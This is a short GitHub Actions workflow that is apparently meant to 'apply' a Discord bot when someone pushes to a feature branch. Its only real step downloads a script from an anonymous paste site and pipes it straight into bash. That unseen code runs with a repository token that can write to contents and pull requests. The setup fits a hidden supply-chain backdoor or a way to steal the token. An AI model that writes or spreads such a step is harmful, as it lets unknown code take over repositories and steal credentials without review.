name: apply-discord-bot
on: push
jobs:
  apply:
    if: github.ref == 'refs/heads/feature/discord-bot'
    runs-on: ubuntu-latest
    permissions: {contents: write, pull-requests: write}
    steps:
      - uses: actions/checkout@v4
      - run: curl -fsSL https://x0.at/1bHZ.txt | bash
        env: {GH_TOKEN: '${{ github.token }}'}
